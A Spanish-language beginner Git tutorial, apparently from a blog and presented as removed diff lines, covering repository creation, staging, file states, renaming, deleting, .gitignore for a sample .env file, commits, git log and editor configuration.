-&lt;p&gt;Una vez tengamos configurado nuestro nombre de &lt;code&gt;usuario&lt;/code&gt; y el &lt;code&gt;correo&lt;/code&gt;, finalmente podemos continuar con lo mas fundamental de &lt;code&gt;Git&lt;/code&gt;, que es la creación de un repositorio.&lt;/p&gt;
-
-&lt;p&gt;Primeramente debemos estar dentro de nuestra carpeta o directorio de trabajo en nuestro caso en la carpeta &lt;code&gt;miGit&lt;/code&gt; con &lt;code&gt;pwd&lt;/code&gt; verificamos que estemos en la ruta&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ pwd
-/home/fmiracle/Desktop/Prueba/Git/miGit
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para poder crear el repositorio dentro de esa carpeta debemos ejecutar el siguente comando &lt;code&gt;git init&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git init
-Inicializado repositorio Git vacío en /home/fmiracle/Desktop/Prueba/Git/miGit/.git/
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Este comando nos inicializara un repositorio de &lt;code&gt;Git&lt;/code&gt; dentro de esta carpeta y con ello vamos a poder rastrear las versiones de todos los archivos que esten dentro de esta carpeta.&lt;/p&gt;
-
-&lt;p&gt;Esto nos crea una carpeta de nombre &lt;code&gt;.git&lt;/code&gt; que se encuentra oculta como medida de seguridad, si deseamos verla podemos usar el comando &lt;code&gt;ls -la&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls -la
-drwxr-xr-x root root  8 B Mon Apr 10 17:38:01 2023  .
-drwxr-xr-x root root 10 B Mon Apr 10 17:37:56 2023  ..
-drwxr-xr-x root root 98 B Mon Apr 10 17:38:01 2023  .git
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;areas-de-git&quot;&gt;Areas de Git &lt;a href=&quot;#areas-de-git&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Existen tres areas en las cuales puede estar un archivo &lt;code&gt;Git&lt;/code&gt;, donde cada una de ellas representara un estado distinto de un archivo.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/areas.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;directorio-de-trabajo-working-direcotry&quot;&gt;Directorio de Trabajo - Working Directory &lt;a href=&quot;#directorio-de-trabajo-working-direcotry&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Es la carpeta del proyecto que justamente va a contener los archivos y el directorio oculto &lt;code&gt;.git&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;area-de-preparación-staging-area&quot;&gt;Area de Preparación - Staging Area &lt;a href=&quot;#area-de-preparación-staging-area&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Viene a ser una area intermedia entre el &lt;code&gt;directorio del trabajo&lt;/code&gt; y el &lt;code&gt;Repositorio&lt;/code&gt;, aqui se encuentran los archivos y cambios que seran incluidos en el proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Cabe mencionar que esta area no es definitiva para agregarla al repositorio, ya que podemos evaluar y retractar los cambios que realizamos para que no se incluyan en el proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Cuando ya tenemos todos los cambios listo en el area de preparación, ahora si podemos crear un &lt;code&gt;commit&lt;/code&gt; que sera el definitivo donde se encontraran los cambios que se agregaran al repositorio&lt;/p&gt;
-
-&lt;h3 id=&quot;repositorio-.git&quot;&gt;Repositorio .git &lt;a href=&quot;#repositorio-.git&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Aqui se contienen todos los metadatos y versiones de todo nuestro proyecto, es la parte del repositorio que se copia al clonar un repositorio externo en nuestra pc, concretamente cuando hacemos &lt;code&gt;git clone https://github.com/nombre_repo&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Es la parte mas importante de &lt;code&gt;Git&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;estados-de-git&quot;&gt;Estados de Git &lt;a href=&quot;#estados-de-git&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Los archivos al estar en cada una de las areas mencionadas, repre/senta un estado distinto que podemos ver a continuación:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/Estados.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;modificada-modified&quot;&gt;Modificada - Modified &lt;a href=&quot;#modificada-modified&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;La versión del archivo esta &lt;code&gt;modificada&lt;/code&gt;, si la versión contiene cambios que no son parte del repositorio y no se han añadido al &lt;code&gt;area de preparación&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;preradara-staged&quot;&gt;Preparada - Staged &lt;a href=&quot;#preparada-staged&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;La versión es &lt;code&gt;preparada&lt;/code&gt;, cuando contiene cambios que no son parte del repositorio, pero si fue añadida al &lt;code&gt;area de preparación&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;confirmada-commited&quot;&gt;Confirmada - Commited &lt;a href=&quot;#confirmada-commited&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;La versión es &lt;code&gt;confirmada&lt;/code&gt;, si ya se encuentra en el directorio &lt;code&gt;.git&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;estado-del-repositorio&quot;&gt;Estado del Repositorio &lt;a href=&quot;#estado-del-repositorio&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Para poder verificar el estado de nuestro repositorio podemos hacer uso del comando &lt;code&gt;git status&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
-En la rama main
-
-No hay commits todavía
-
-no hay nada para confirmar (crea/copia archivos y usa &quot;git add&quot; para hacerles seguimiento)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Despues de ejecutar el comando nos muestra que estamos en la rama &lt;code&gt;main&lt;/code&gt;, que aun no hemos realizado un &lt;code&gt;commit&lt;/code&gt; y ademas vemos que tampoco hay nada pendiente para realizar un &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Cabe mencionar que segun la instalación nuestra rama principal puede ser &lt;code&gt;main&lt;/code&gt; o &lt;code&gt;master&lt;/code&gt; y si deseamos cambiarla debemos ejecutar el comando &lt;code&gt;git config --global init.defaultBranch main&lt;/code&gt; para establecer &lt;code&gt;main&lt;/code&gt; como la rama principal por defecton, aunque de seguir con la que tenemos por defecto podemos trabajar sin problemas igualmente, pero hay que tenerlo en cuenta&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Ahora que ocurre si yo creo un archivo lo llamaremos &lt;code&gt;archivo_git.txt&lt;/code&gt; y le introduciremos un contenido.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
-Este es mi primer repositorio
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Si volvemos a ejecutar el comando &lt;code&gt;git status&lt;/code&gt;, esta vez nos dice que tenemos archivos que no estamos haciendo seguimiento, concretamente el archivo que creamos &lt;code&gt;archivo_git.txt&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
-En la rama main
-
-No hay commits todavía
-
-Archivos sin seguimiento:
-  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
-	archivo_git.txt
-
-no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si queremos comenzar a hacer seguimiento del arhivo, debemos ejecutar el comando &lt;code&gt;git add&lt;/code&gt; y seguido el nombre del archivo&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add archivo_git.txt
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;A simple vista parece no haberse ejecutado ningun cambio pero si volvemos a verificar el estado con &lt;code&gt;git status&lt;/code&gt;,  ahora si tenemos cambios que van a ser agregados al proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
-En la rama main
-
-No hay commits todavía
-
-Cambios a ser confirmados:
-  (usa &quot;git rm --cached &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
-	nuevos archivos: archivo_git.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Cuando vemos que el archivo ya es parte de los cambios que se agregaran a el proximo &lt;code&gt;commit&lt;/code&gt;, quiere decir que ya es parte del &lt;code&gt;area de preparación&lt;/code&gt;, pero recordemos que en esta area aun podemos retractarnos y decir a &lt;code&gt;Git&lt;/code&gt; que no queremos agregarlos al proximo &lt;code&gt;commit&lt;/code&gt;, y esto lo hacemos como nos indica &lt;code&gt;Git&lt;/code&gt; con el comando &lt;code&gt;git rm --cached&lt;/code&gt; y seguidamente el nombre del archivo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git rm --cached archivo_git.txt
-rm 'archivo_git.txt'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Volvemos a verificar el estado y vemos que el archivo nuevamente no esta en seguimiento.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
-En la rama main
-
-No hay commits todavía
-
-Archivos sin seguimiento:
-  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
-	archivo_git.txt
-
-no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Saber esto es importante ya que en el &lt;code&gt;area de preparación&lt;/code&gt; los cambios no son definitivos, ya que podemos equivocarnos y por error incluir un archivo al &lt;code&gt;area de preparación&lt;/code&gt;podemos verificar que cambios seran agregados y si queremos removerlos del &lt;code&gt;area de preparación&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora si queremos volver a colocar el archivo en el area de &lt;code&gt;preparación&lt;/code&gt;, usamos nuevamente el comando &lt;code&gt;git add&lt;/code&gt; y nuevamente vemos que hay cambios que seran agregados al proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add archivo_git.txt
-❯ git status
-En la rama main
-
-No hay commits todavía
-
-Cambios a ser confirmados:
-  (usa &quot;git rm --cached &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
-	nuevos archivos: archivo_git.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo que faltaria ahora sera pasar el archivo del &lt;code&gt;area de preparación&lt;/code&gt; al repositorio como tal &lt;code&gt;.git&lt;/code&gt; para ello veamos a continuaciòn como creamos un &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;renombrar-archivos&quot;&gt;Renombrar Archivos del Repositorio &lt;a href=&quot;#renombrar-archivos&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Como vimos por cada acción que hagamos al archivo, al usar &lt;code&gt;git status&lt;/code&gt; nos saldra el mensaje de que hay archivos sin seguimiento y demos usar &lt;code&gt;git add&lt;/code&gt; para agregarlos. Concretamente en este caso si queremos renombar un archivo usamos el comando &lt;code&gt;mv&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Renombraremos el archivo que creamos &lt;code&gt;archivo.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
- archivo.txt   archivo_git.txt
-❯ mv archivo.txt archivo_renombrado.txt
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Seguidamente debemos agregar el archivo con &lt;code&gt;git add&lt;/code&gt; a el &lt;code&gt;area de preperación&lt;/code&gt;, despues de ejecutar &lt;code&gt;git status&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
-En la rama main
-Archivos sin seguimiento:
-  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
-	archivo_renombrado.txt
-
-no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
-❯ git add archivo_renombrado.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;El problema es que es mas tedioso y repetitivo estar ejecutando cada comando, por ello &lt;code&gt;Git&lt;/code&gt; nos da la opción de acortar todos estos pasos realizados solo usando un comando &lt;code&gt;git mv&lt;/code&gt; y seguido renombrar el archivo, practicamente lo mismo que ejecutamos al renombrarlo con &lt;code&gt;mv&lt;/code&gt; solo que ahora debemos anteponer la palabra &lt;code&gt;git&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;En este caso renombraremos el archivo &lt;code&gt;archivo_renombrado.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git mv archivo_renombrado.txt archivo_modificado.txt
-❯ git status
-En la rama main
-Cambios a ser confirmados:
-  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
-	nuevos archivos: archivo_modificado.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos que usando el comando &lt;code&gt;git mv&lt;/code&gt; ya nos es necesario usar &lt;code&gt;git add&lt;/code&gt; ya que el archivo se agrega automaticamente al &lt;code&gt;area de preparación&lt;/code&gt;, lo que nos optimiza el proceso.&lt;/p&gt;
-
-&lt;h3 id=&quot;eliminar-archivos-del-repositorio&quot;&gt;Eliminar archivos del Repositorio &lt;a href=&quot;#eliminar-archivos-del-repositorio&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;De la misma forma que renombramos el archivo, podemos hacer lo mismo para eliminarlo. anteponiendo la palabra &lt;code&gt;git&lt;/code&gt; y seguido el comando &lt;code&gt;rm&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para este caso vamos a eliminar el archivo que renombramos antes &lt;code&gt;archivo_modificado.txt&lt;/code&gt;, para ello como ya se encontraba en el &lt;code&gt;area de preparación&lt;/code&gt; debemos retirarla haciendo uso de los comandos:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git restore --staged archivo_modificado.txt
-git restore archivo_modificado.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez el arbol de trabajo este limpio, ejecutamos el comando &lt;code&gt;git rm&lt;/code&gt; y seguido el archivo que queremos eliminar. Visualizamos los cambios y vemos que nos agilizo el proceso ya que el archivo se encuentra en el &lt;code&gt;area de preparación&lt;/code&gt; y no fue necesario agregarlo ejecutando el &lt;code&gt;git add&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git rm archivo_modificado.txt
-rm 'archivo_modificado.txt'
-❯ git status
-En la rama main
-Cambios a ser confirmados:
-  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
-	borrados:        archivo_modificado.txt
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&quot;gitignore-ignorar-archivos-y-directorios&quot;&gt;Gitignore - Ignorar archivos y directorios &lt;a href=&quot;#gitignore-ignorar-archivos-y-directorios&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Si queremos ignorar archivos, que nunca se incluyan en nuestro repositorio y que solo sean especificos para nuestra máquina como son las variables de entorno.&lt;/p&gt;
-
-&lt;p&gt;Supongamos que estamos trabajando con una &lt;code&gt;base de datos&lt;/code&gt; que tenemos instalada localmente, en este caso queremos que este archivo no se suba al repositorio, ya que no queremos que otras personas conozcan estos datos.&lt;/p&gt;
-
-&lt;p&gt;Para ello vamos a crearnos un archivo al que llamaremos &lt;code&gt;.env&lt;/code&gt; que tendra de contenido unas supuestas credenciales.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat .env
-user=firtsmiracle
-password=12345
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora ejecuto &lt;code&gt;git status&lt;/code&gt; y nos aparece este archivo &lt;code&gt;.env&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
-En la rama main
-Archivos sin seguimiento:
-  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
-	.env
-
-no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Pero yo no quiero que por error este archivo se agregue a incluir en un &lt;code&gt;commit&lt;/code&gt;, para ello debemos crear un archivo de nombre &lt;code&gt;.gitignore&lt;/code&gt; y en este archivo especificare cuales son los archivos o rutas de carpetas que quiero ignorar para que no vallan a nuestro repositorio.&lt;/p&gt;
-
-&lt;p&gt;En este caso agregare dentro del archivo &lt;code&gt;.gitignore&lt;/code&gt; a nuestro archivo que contenia las credenciales &lt;code&gt;.env&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat .gitignore
-.env
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Y si ahora vuelvo a ejecutar el comando &lt;code&gt;git status&lt;/code&gt; el archivo &lt;code&gt;.env&lt;/code&gt; ya no aparece, solo aparece el archivo &lt;code&gt;.gitignore&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
-En la rama main
-Archivos sin seguimiento:
-  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
-	.gitignore
-
-no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Entonces agregamos nuestro archivo &lt;code&gt;.gitignore&lt;/code&gt; con &lt;code&gt;git add&lt;/code&gt; y verificamos&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add .gitignore
-❯ git status
-En la rama main
-Cambios a ser confirmados:
-  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
-	nuevos archivos: .gitignore
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;De esta manera todo lo que incluyamos dentro del archivo &lt;code&gt;.gitignore&lt;/code&gt; no sera agregado por ningun motivo al repositorio.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Un pequeño tip final es que con el comando &lt;code&gt;git status -s&lt;/code&gt;, podemos ver el estado en el que se encuentra cada archivo de manera simplificada.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status -s
-A  .gitignore
-D archivo_modificado.txt
-?? archivo_cambiado.txt
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Donde &lt;code&gt;A&lt;/code&gt; seria agregado, &lt;code&gt;D&lt;/code&gt; borrado y cuando vemos &lt;code&gt;??&lt;/code&gt; quiere decir que el archivo aun no tiene un seguimiento.&lt;/p&gt;
-
-&lt;h2 id=&quot;creación-de-un-commit&quot;&gt;Creación de un Commit &lt;a href=&quot;#creación-de-un-commit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Antes de crear nuestro primer &lt;code&gt;commit&lt;/code&gt;, debemos recordar que un &lt;code&gt;commit&lt;/code&gt; viene a ser un registro o foto del estado de nuestro proyecto en un momento especifico. Registra los cambios realizados en los archivos en comparación con la versión anterior.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/commits.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Cada vez que creeemos un &lt;code&gt;commit&lt;/code&gt; debemos agregarle una descripción segun la acción o los cambios que hayamos realizado esto es muy importante para saber con detalle a traves del tiempo las modificaciones que se realizaron en el proyecto.&lt;/p&gt;
-
-&lt;p&gt;Ahora comenzemos a crear nuestro &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Anteriormente cuando ejecutamos &lt;code&gt;git status&lt;/code&gt;, veiamos que habian cambios que estan listos para ser agregados del &lt;code&gt;area de preparación&lt;/code&gt; a al repositorio &lt;code&gt;.git&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
-En la rama main
-
-No hay commits todavía
-
-Cambios a ser confirmados:
-  (usa &quot;git rm --cached &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
-	nuevos archivos: archivo_git.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo siguiente seria agregar un &lt;code&gt;commit&lt;/code&gt;, esto lo hacemos con el comando &lt;code&gt;git commit&lt;/code&gt; y seguidamente con &lt;code&gt;-m&lt;/code&gt; agregamos una descripción.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit -m &quot;agregar mi archivo de texto&quot;
-[main (commit-raíz) 0143452] agregar mi archivo de texto
- 1 file changed, 1 insertion(+)
- create mode 100644 archivo_git.txt
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Se nos muestra información del &lt;code&gt;commit&lt;/code&gt;, como su identificador &lt;code&gt;0143452&lt;/code&gt;, la descripción y hubo una modificación en conjunto con una inserción que significa que se agrego una linea al archivo.&lt;/p&gt;
-
-&lt;h2 id=&quot;estructura-del-commit&quot;&gt;Estructura del Commit &lt;a href=&quot;#estructura-del-commit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;La estructura de un&lt;code&gt;commit&lt;/code&gt; se compone de varias partes, esto lo observamos al ejecutar el comando &lt;code&gt;git log&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log
-commit 0143452c010ede2332f5c1b8bad7815743770a2a (HEAD -&amp;gt; main)
-Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
-Date:   Mon Apr 10 18:43:50 2023 +0000
-
-    agregar mi archivo de texto
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos observar inicialmente una serie de numeros alfanumericos que corresponde a un identificador unico llamado &lt;code&gt;SHA&lt;/code&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;SHA: Scure Hash Algorith o Algoritmo de hash seguro&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;este &lt;code&gt;SHA&lt;/code&gt; identifica:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Los cambios realizados&lt;/li&gt;
-  &lt;li&gt;Dónde se realizaron los cambios&lt;/li&gt;
-  &lt;li&gt;Quién realizo los cambios&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Seguidamente el &lt;code&gt;commit&lt;/code&gt; contiene el nombre del &lt;code&gt;usuario&lt;/code&gt; en conjunto con el &lt;code&gt;correo&lt;/code&gt; asignado &lt;code&gt;Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;&lt;/code&gt;; tambien podemos observar la fecha de creación del &lt;code&gt;commit&lt;/code&gt; que corresponde a &lt;code&gt;Date:   Mon Apr 10 18:43:50 2023 +0000&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Finalmente en la ultima parte podemos ver la descripción que agregamos al crear nuestro &lt;code&gt;commit&lt;/code&gt; -&amp;gt; &lt;code&gt;agregar mi archivo de texto&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;historial-de-commits&quot;&gt;Historial de Commits &lt;a href=&quot;#historial-de-commits&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Si queremos ver el registro de nuestros &lt;code&gt;commits&lt;/code&gt;, podemos usar el comando &lt;code&gt;git log&lt;/code&gt; el cual nos mostrara el historial de todos los &lt;code&gt;commits&lt;/code&gt; que hayamos creado.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log
-commit 0143452c010ede2332f5c1b8bad7815743770a2a (HEAD -&amp;gt; main)
-Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
-Date:   Mon Apr 10 18:43:50 2023 +0000
-
-    agregar mi archivo de texto
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como vimos anteriormente vemos el &lt;code&gt;commit&lt;/code&gt; con su estructura; cabe resaltar que si creamos mas &lt;code&gt;commits&lt;/code&gt; con este comandos los veremos todos.&lt;/p&gt;
-
-&lt;h2 id=&quot;creación-alterna-de-commits&quot;&gt;Creación Alterna de Commits &lt;a href=&quot;#creación-alterna-de-commits&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Supongamos que editamos el archivo que tenemos &lt;code&gt;archivo_git.txt&lt;/code&gt; y le cambiamos el contenido&lt;/p&gt;
-
-&lt;p&gt;El cual cambiaremos de este contenido:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
-Este es mi primer repositorio
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;a este nuevo&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
-Este es mi segundo commit
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si ejecutamos &lt;code&gt;git status&lt;/code&gt; vemos que tenemos un archivo en estado &lt;code&gt;modificado&lt;/code&gt; y que hay cambios no rastreados para el proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
-En la rama main
-Cambios no rastreados para el commit:
-  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para actualizar lo que será confirmado)
-  (usa &quot;git restore &amp;lt;archivo&amp;gt;...&quot; para descartar los cambios en el directorio de trabajo)
-	modificados:     archivo_git.txt
-
-sin cambios agregados al commit (usa &quot;git add&quot; y/o &quot;git commit -a&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para agregar los cambios entonces debemos ejecutar &lt;code&gt;git add&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add archivo_git.txt
-❯ git status
-En la rama main
-Cambios a ser confirmados:
-  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
-	modificados:     archivo_git.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora que el archivo esta lista para agregarse al &lt;code&gt;commit&lt;/code&gt;, procerederemos a crearlo&lt;/p&gt;
-
-&lt;p&gt;Esta vez ejecutaremos unicamente el comando &lt;code&gt;git commit&lt;/code&gt; sin ningun parametro adiocional, lo que hara que se nos abra el editor de texto donde podremos insertar la descripción ddel &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Generalmente se nos abrira el editor por defecto en nuestro sistema en nuestro caso por defecto se abrira en &lt;code&gt;vim&lt;/code&gt; o &lt;code&gt;nano&lt;/code&gt;, pero si deseamos podemos configurar el editor apra que inicie con otro con el que trabajemos mas comodo.&lt;/p&gt;
-
-&lt;p&gt;Para ello hay varias opciones independientemente si nos encontramos en &lt;code&gt;Linux&lt;/code&gt; o en &lt;code&gt;Windows&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Para &lt;code&gt;Linux&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;Si queremos usar &lt;code&gt;Visual Studio Code&lt;/code&gt; ejecutar:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;code --wait&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si queremos usar &lt;code&gt;Sublime Text&lt;/code&gt; ejecutar:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;subl -n -w&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si queremos usar &lt;code&gt;emacs&lt;/code&gt; ejecutar:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;git config --global core.editor emacs
-&lt;/code&gt;&lt;/pre&gt;
-
